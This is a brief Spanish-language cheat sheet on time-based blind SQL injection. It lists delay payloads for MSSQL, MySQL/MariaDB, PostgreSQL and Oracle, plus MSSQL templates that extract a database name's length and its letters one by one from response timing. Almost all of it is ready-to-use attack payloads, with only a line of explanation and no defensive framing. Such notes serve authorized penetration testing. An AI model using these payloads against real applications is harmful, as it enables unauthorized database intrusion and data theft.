### Info

Aplicamos lógica de tiempo en SQL para ver si se inyecta y es validada analizando el tiempo que tardó la response.

### PAYLOADS

| DB   | payload |
|----------|------|
| MSSQL     | '; IF 1=1 WAITFOR DELAY '0:0:10'--  |
| MySQL/MariaDB    | AND (SELECT SLEEP(10) FROM dual WHERE database() LIKE '%')  |
| PostgreSQL    | \|\| (SELECT 1 FROM PG_SLEEP(10))   |
| Oracle    | AND 1234=DBMS_PIPE.RECEIVE_MESSAGE('RaNdStR',10)  |


### Extraer el length del nombre de una db

    <dato>'; IF (LEN(db_name()))=<num> WAITFOR DELAY '0:0:10'-- 

### Extraer el nombre de una DB

    <dato>'; IF (select substring(db_name(),<index>,1))='<letra>' WAITFOR DELAY '0:0:10'-- 




## Apéndice:
SQLMAP tiene todas las respuestas xD
